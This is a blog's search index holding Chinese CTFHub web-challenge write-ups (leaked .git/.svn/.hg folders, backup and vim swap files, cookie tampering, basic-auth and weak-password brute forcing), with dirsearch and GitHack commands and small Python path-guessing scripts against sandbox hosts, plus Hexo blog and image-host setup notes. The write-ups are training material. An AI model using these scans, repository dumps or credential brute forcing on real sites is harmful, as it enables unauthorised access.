<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>.DS_Store</title>
    <url>/2022/10/16/DS_Store/</url>
    <content><![CDATA[<h3 id="法一-dirsearch-linux查看"><a href="#法一-dirsearch-linux查看" class="headerlink" title="法一:dirsearch+linux查看"></a>法一:dirsearch+linux查看</h3><p>dirsearch开扫</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152153541.png" alt="1"></p>
<p>得到.DS_Store文件，丢到浏览器下载后在linux内打开</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152153667.png" alt="2"></p>
<p>在看到.txt文件，丢到浏览器中打开得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152153584.png" alt="flag"></p>
<h3 id="法二-dirsearch-python-dsstore查看"><a href="#法二-dirsearch-python-dsstore查看" class="headerlink" title="法二:dirsearch+python dsstore查看"></a>法二:dirsearch+python dsstore查看</h3><p>同法一，得到DS_Store</p>
<p>将得到的文件用dsstore打开</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152153738.png" alt="3"></p>
<p>得到.txt文件</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>ctfhub</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>Index</title>
    <url>/2022/10/16/Index/</url>
    <content><![CDATA[<p>dirsearch开扫</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150785.png" alt="1"></p>
<p>看到有.git文件，用githack抓出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 .\GitHack.py http://challenge-241983fae914b573.sandbox.ctfhub.com:10800/.git`</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150576.png" alt="2"></p>
<p>进入目录直接看到.txt文件，打开得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150144.png" alt="flag"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>ctfhub</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>Cookie</title>
    <url>/2022/10/16/Cookie/</url>
    <content><![CDATA[<p>打开URL如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152138827.png" alt="1"></p>
<p>得知要使用admin登陆</p>
<p>刷新拦截一下请求</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152138275.png" alt="2"></p>
<p>将admin&#x3D;0改为admin&#x3D;1并发送，得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152138254.png" alt="flag"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>ctfhub</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>Log</title>
    <url>/2022/10/16/Log/</url>
    <content><![CDATA[<p>dirsearch开扫</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152151130.png" alt="1"></p>
<p>看到有.git文件夹，用githack下下来（仅支持python2）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 Githuck.py http://challenge-b4001d8a6ccbd18d.sandbox.ctfhub.com:10800/.git</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152151227.png" alt="2"></p>
<p>去到.git同级目录，输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure>

<p>查看之前对仓库的操作，发现第二次添加了flag，考虑恢复</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git reset --hard HEAD^</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git diff HEAD^</span><br></pre></td></tr></table></figure>

<p>得到历史文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152579.png" alt="3"></p>
<p>查看.txt文件得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152969.png" alt="flag"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>ctfhub</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>302跳转</title>
    <url>/2022/10/16/302%E8%B7%B3%E8%BD%AC/</url>
    <content><![CDATA[<p>打开URL如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152137392.png" alt="1"></p>
<p>打开Intercept并进入HTTP history查看</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152137699.png" alt="2"></p>
<p>发现两处302跳转，查看得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152137958.png" alt="flag"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>ctfhub</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>SVN泄露</title>
    <url>/2022/10/16/SVN%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<p>dirsearch扫出来有.svn目录，用dvcs-ripper找一下svn</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148622.png" alt="1"></p>
<p>进入.svn目录（隐藏文件夹，要用ls -a查看），在pristine目录中有两个文件夹，找到旧版的（08）</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148364.png" alt="2"></p>
<p>cat查看文件得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148693.png" alt="flag"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>ctfhub</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>HG泄露</title>
    <url>/2022/10/16/HG%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<p>dirsearch开扫发现有.hg残留，在kali中用dvcs-ripper找一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148718.png" alt="1"></p>
<p>发现部分404，但是在store-fncache中仍有文件显示</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148457.png" alt="2"></p>
<p>拼接url+flag得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148992.png" alt="flag"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>ctfhub</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPINFO</title>
    <url>/2022/10/16/PHPINFO/</url>
    <content><![CDATA[<p>打开目标url，进入phpinfo界面</p>
<p>搜索flag关键词得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148724.png" alt="flag"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>ctfhub</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>Stash</title>
    <url>/2022/10/16/Stash/</url>
    <content><![CDATA[<h3 id="法一：git-differ"><a href="#法一：git-differ" class="headerlink" title="法一：git differ"></a>法一：git differ</h3><p>dirsearch开扫</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152466.png" alt="1"></p>
<p>发现.git，用hackgit抓下来，得到.git文件夹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152801.png" alt="2"></p>
<p>进入.git&#x2F;refs，查看stash文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152478.png" alt="3"></p>
<p>在gtihash中对比一下，得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152396.png" alt="flag"></p>
<h3 id="法二：git-stash-pop"><a href="#法二：git-stash-pop" class="headerlink" title="法二：git stash pop"></a>法二：git stash pop</h3><p>得到.git文件夹后，直接查看stash</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152860.png" alt="5"></p>
<p>执行<code>git stash pop</code>发现弹出文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152563.png" alt="6"></p>
<p>查看该文件得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152152465.png" alt="flag-2"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>ctfhub</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>bak文件</title>
    <url>/2022/10/16/bak%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<p>打开URL有：</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154080.png" alt="1"></p>
<p>使用dirsearch扫描文件</p>
<p>在dirsearch目录执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python .\dirsearch.py -u http://challenge-b2eb848d1933d253.sandbox.ctfhub.com:10800 -e * -x 502,503</span><br></pre></td></tr></table></figure>

<p>等待扫描完成发现有index.php.bak文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154858.png" alt="2"></p>
<p>直接下载.bak文件打开发现flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154439.png" alt="flag"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>ctfhub</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>响应包源代码</title>
    <url>/2022/10/16/%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<p>打开URL发现是游戏</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152147675.png" alt="1"></p>
<p>打开源代码发现flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152147590.png" alt="flag"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>ctfhub</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建博客</title>
    <url>/2022/10/16/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h3 id="Github操作"><a href="#Github操作" class="headerlink" title="Github操作"></a>Github操作</h3><p>先申请一个名字为 <code>&lt;username&gt;.github.io</code> 的<strong>公开</strong>仓库，readme.md随意加不加</p>
<p>然后git bash绑定一下自己的账号，具体百度一堆</p>
<h3 id="本地操作"><a href="#本地操作" class="headerlink" title="本地操作"></a>本地操作</h3><p>安装一下hexo的依赖：node.js和git</p>
<p>找个地新建文件夹，在文件夹内右键打开git bash</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162050819.png" alt="image-20221016205042788"></p>
<p>然后输入以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 安装 hexo 框架</span><br><span class="line">npm install -g hexo-cli</span><br><span class="line"># 初始化文件夹</span><br><span class="line">hexo init</span><br><span class="line"># 安装 hexo 依赖包</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>

<p>（hexo init可能会卡在安装依赖上，挂个梯子，git上设置一下代理）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 设置代理</span><br><span class="line">git config --global http.proxy http://serverip:port</span><br><span class="line">git config --global https.proxy http:/serverip:port</span><br><span class="line"># 设置带用户名密码的代理</span><br><span class="line"># 注意：如果密码中带了特殊字符需要进行转义, 将特殊字符替换为下面对应的转义字符即可</span><br><span class="line">#  !   #   $   &amp;   &#x27;   (    )  *   +   ,   /   :   ;   =   ?   @   [   ]</span><br><span class="line"># %21 %23 %24 %26 %27 %28 %29 %2A %2B %2C %2F %3A %3B %3D %3F %40 %5B %5D</span><br><span class="line">npm config set proxy http://username:password@serverip:port</span><br><span class="line">npm confit set https-proxy http://username:password@serverip:port</span><br><span class="line"># 取消代理</span><br><span class="line">git config --global --unset http.proxy</span><br><span class="line">git config --global --unset https.proxy</span><br></pre></td></tr></table></figure>

<p>执行完成之后，目录大概是这样的</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162031068.png" alt="image-20221016203139039"></p>
<p>然后在这个目录下用<code>cmd/git bash/powershell</code>执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 生成静态网站</span><br><span class="line">hexo g</span><br><span class="line"># 启动服务器</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p>然后访问<code>http://localhost:4000/</code>测试是否成功</p>
<p>成功之后安装一下发布插件</p>
<p>在git bash里输入<code>npm install hexo-deployer-git</code>，安装完配置一下根目录下<code>_config.yml</code>的文件，在deploy一栏填一下发布的类型，申请的仓库地址，分支</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162043684.png" alt="image-20221016204336663"></p>
<h3 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h3><p>执行一下<code>hexo d</code>就发布好了（每次重新发布记得<code>hexo clea &amp;&amp; hexo g</code>重建一下）</p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>国内网真是哈哈了，干啥都要挂梯子、换源，有问题百度+google然后C+V就完事了</p>
]]></content>
      <categories>
        <category>配置</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>基础认证</title>
    <url>/2022/10/16/%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81/</url>
    <content><![CDATA[<p>打开URL点击click</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152145795.png" alt="1"></p>
<p>在HTTP history中查看response，注意到认证提示“Basic realm&#x3D;”Do u know admin ?””</p>
<p>猜测登陆用户名为admin</p>
<p>输入用户名密码后抓包，看到base64加密后的字符</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152145934.png" alt="2"></p>
<p>在解码器中发现是账号:密码的格式，而账号为admin</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146262.png" alt="3"></p>
<p>使用爆破模块intruder</p>
<p>将该请求发送到intruder，将basic后面的字符选中并点击右侧Add§</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146966.png" alt="4"></p>
<p>进入payloads导入ctfhub给的密码本</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146548.png" alt="5"></p>
<p>同时添加前缀admin:（注意中间的:）</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146884.png" alt="6"></p>
<p>添加base64编码</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146899.png" alt="7"></p>
<p>取消url编码，不然&#x3D;会被转化为%3d</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146329.png" alt="8"></p>
<p>开始爆破</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146048.png" alt="9"></p>
<p>筛选状态200并查看返回值，得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146336.png" alt="flag"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>ctfhub</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建图床</title>
    <url>/2022/10/16/%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><h4 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h4><p>先在github上申请一个<strong>公开</strong>仓库</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162108241.png" alt="image-20221016210831200"></p>
<p>随便填一填然后申请，记下来仓库名字</p>
<h4 id="申请Token"><a href="#申请Token" class="headerlink" title="申请Token"></a>申请Token</h4><p>github中点开Setting-Developer settings</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162113745.png" alt="image-20221016211329717"></p>
<p>左侧选择Personal access tokens</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162114646.png" alt="image-20221016211407617"></p>
<p>权限里全选择repo，然后生成token，记下给出来的token</p>
<h2 id="Pic-Go"><a href="#Pic-Go" class="headerlink" title="Pic Go"></a>Pic Go</h2><p>下载一个PicGo：<code>https://github.com/Molunerfinn/picgo/releases</code></p>
<p>下载之后在图床设置-Github中如下设置</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162115272.png" alt="image-20221016211527242"></p>
<p>仓库名选择刚刚申请的仓库，分支填master&#x2F;main，token填刚刚申请的token</p>
<p>国内访问慢的话可以用jsdelivr的加速服务，具体百度</p>
<p>填完点选确定就好了</p>
<h2 id="Typora"><a href="#Typora" class="headerlink" title="Typora"></a>Typora</h2><p>在偏好设置-图像设置里如下设置</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162117765.png" alt="image-20221016211742739"></p>
<p>上传服务选PicGo(app)，路径选择PicGo的安装目录</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162118544.png" alt="image-20221016211820516"></p>
<p>这样设置的话每次拖放图片就可以自动调用PicGo上传</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>不得不说一下，应该是国内网的问题，typora设置了代理才能显示图片，但picgo里就算代理了也没法加载图片，不知道啥情况</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210162121720.png" alt="image-20221016212153691"></p>
<p>真要玉玉了</p>
]]></content>
      <categories>
        <category>配置</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>弱口令</title>
    <url>/2022/10/16/%E5%BC%B1%E5%8F%A3%E4%BB%A4/</url>
    <content><![CDATA[<p>burp里抓包登陆请求，发送到爆破模组里</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152134978.png" alt="1"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152134686.png" alt="2"></p>
<p>选上下面的用户密码，用集束炸弹方式攻击</p>
<p>payload1,2分别使用简单的弱口令</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152135801.png" alt="3"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152136869.png" alt="4"></p>
<p>选中长度排序，得到爆破成功的的对应密码，查看response得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152136843.png" alt="flag"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>ctfhub</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>请求方式</title>
    <url>/2022/10/16/%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152147545.png" alt="1"></p>
<p>注意到题中要求使用CTF**B Method，故在Burp-Suite将GET方式改为CTFHUB（区分大小写）。</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152147440.png" alt="2"></p>
<p>将Intercept打开后打开浏览器并填入URL，将橙色标识中的GET方法改为CTFHUB后发送，得到如下flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152147987.png" alt="flag"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>ctfhub</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>目录遍历</title>
    <url>/2022/10/16/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/</url>
    <content><![CDATA[<h3 id="法一：Burp-Suite"><a href="#法一：Burp-Suite" class="headerlink" title="法一：Burp Suite"></a>法一：Burp Suite</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152149039.png" alt="0"></p>
<p>注意到目录为4*4的文件夹</p>
<p>进入到最后一级目录，发送URL到intruder中</p>
<p>分别选择攻击类型：cluster bomb，选择变化的位置，设置payload的sets和options</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152149124.png" alt="1"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152149552.png" alt="2"></p>
<p>设置完成后开始</p>
<p>在结果页中发现长度明显不一致的返回，查看返回内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150023.png" alt="3"></p>
<p>从而得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150584.png" alt="flag"></p>
<h3 id="法二：python"><a href="#法二：python" class="headerlink" title="法二：python"></a>法二：python</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge-0b7cf3fe1d9ef811.sandbox.ctfhub.com:10800/flag_in_here&quot;</span><span class="comment">#靶机url</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):<span class="comment">#i为0-4的数</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):<span class="comment">#j为0-4的数</span></span><br><span class="line">        url_final = url + <span class="string">&quot;/&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;/&quot;</span> + <span class="built_in">str</span>(j)<span class="comment">#将最终的目录拼接出来</span></span><br><span class="line">        r = requests.get(url_final)<span class="comment">#获得服务器返回的Response</span></span><br><span class="line">        r.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">        get_file=r.text<span class="comment">#得到text内容</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> get_file:<span class="comment">#判断flag是否在返回值中</span></span><br><span class="line">            <span class="built_in">print</span>(url_final)</span><br></pre></td></tr></table></figure>

<p>运行结果如下，得到flag目录</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150607.png" alt="4"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>ctfhub</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>vim缓存</title>
    <url>/2022/10/16/vim%E7%BC%93%E5%AD%98/</url>
    <content><![CDATA[<h3 id="法一-dirsearch"><a href="#法一-dirsearch" class="headerlink" title="法一:dirsearch"></a>法一:dirsearch</h3><p>打开URL得到提示</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154166.png" alt="1"></p>
<p>使用dirsearch扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python .\dirsearch.py -u http://challenge-9a421211667ab5ac.sandbox.ctfhub.com:10800 -e swp -x 502,503</span><br></pre></td></tr></table></figure>

<p>主动选择.swp的后缀是因为-e *默认不包括swp文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154664.png" alt="2"></p>
<p>下载index.php.swp后放入linux中使用vim打开</p>
<p>先使用mv将index.php.swp改名为.index.php.swp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv index.php.swp .index.php.swp</span><br></pre></td></tr></table></figure>

<p>再使用vim打开index.php文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim index.php</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154013.png" alt="3"></p>
<p>按R选择恢复得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154710.png" alt="flag"></p>
<h3 id="法二-直接访问"><a href="#法二-直接访问" class="headerlink" title="法二:直接访问"></a>法二:直接访问</h3><p>由题目可得要求得到vim缓存文件</p>
<p>故直接访问.index.php.swp(swp,swo,swn)</p>
<p>得到index.php.swp文件后同法一</p>
<h3 id="法三-curl（未成功）"><a href="#法三-curl（未成功）" class="headerlink" title="法三:curl（未成功）"></a>法三:curl（未成功）</h3><p>可以直接使用curl命令查看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://challenge-9a421211667ab5ac.sandbox.ctfhub.com:10800/.index.php.swp</span><br></pre></td></tr></table></figure>

<p>但出现问题：</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152154095.png" alt="4"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>ctfhub</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>网站源码</title>
    <url>/2022/10/16/%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81/</url>
    <content><![CDATA[<h3 id="法一：Burp-Suite"><a href="#法一：Burp-Suite" class="headerlink" title="法一：Burp Suite"></a>法一：Burp Suite</h3><p>打开url发现提示给了常见的文件及后缀名</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155349.png" alt="1"></p>
<p>进入bs浏览器，随便输一个，例如:web.tar尝试访问</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155308.png" alt="2"></p>
<p>在历史记录中将该次访问发送到intruder中</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155837.png" alt="3"></p>
<p>在源代码中选择攻击类型并选中web和tar</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155045.png" alt="4"></p>
<p>payloads中载入要变化的文件名</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155514.png" alt="5"></p>
<p>填写两个set后开始攻击，找到状态为200的文件，下载</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155141.png" alt="6"></p>
<p>得到flag.txt</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155970.png" alt="7"></p>
<p>将该文件放入浏览器中尝试打开得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155598.png" alt="flag"></p>
<h3 id="法二-dirsearch"><a href="#法二-dirsearch" class="headerlink" title="法二:dirsearch"></a>法二:dirsearch</h3><p>在dirsearch目录中打开powershell，执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python .\dirsearch.py -u http://challenge-584841b234301423.sandbox.ctfhub.com:10800 -e tar,tar.gz,zip,rar -x 502,503</span><br></pre></td></tr></table></figure>

<p>执行完成后得到备份文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155127.png" alt="8"></p>
<p>后续步骤同法一</p>
<h3 id="法三-python"><a href="#法三-python" class="headerlink" title="法三:python"></a>法三:python</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://challenge-584841b234301423.sandbox.ctfhub.com:10800/&quot;</span></span><br><span class="line">list1=[<span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>]</span><br><span class="line">list2=[<span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;tar.gz&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;rar&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">        url_final=url+i+<span class="string">&quot;.&quot;</span>+j</span><br><span class="line">        r=requests.get(url_final)</span><br><span class="line">        <span class="keyword">if</span>(r.status_code == <span class="number">200</span>):</span><br><span class="line">            <span class="built_in">print</span>(url_final)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>ctfhub</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>默认口令</title>
    <url>/2022/10/19/%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/</url>
    <content><![CDATA[<p>打开是网关登陆界面，还有验证码，那就没法用intruder爆破密码了</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210190031447.png" alt="image-20221019003140324"></p>
<p>随便试一个账号密码，显示用户不存在</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210190032401.png" alt="image-20221019003216381"></p>
<p>查看源代码发现是“亿邮邮件网关”，结合title的“默认口令”，试一下是否是出厂的默认设置</p>
<p>直接搜该网关的管理用户</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210190034857.png" alt="image-20221019003431841"></p>
<p>丢进去登陆得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210190035364.png" alt="image-20221019003507338"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>ctfhub</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>python入门</title>
    <url>/2022/11/02/python%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h3 id="level0："><a href="#level0：" class="headerlink" title="level0："></a>level0：</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211021357361.png" alt="0"></p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hallo world!&quot;</span>)</span><br></pre></td></tr></table></figure>

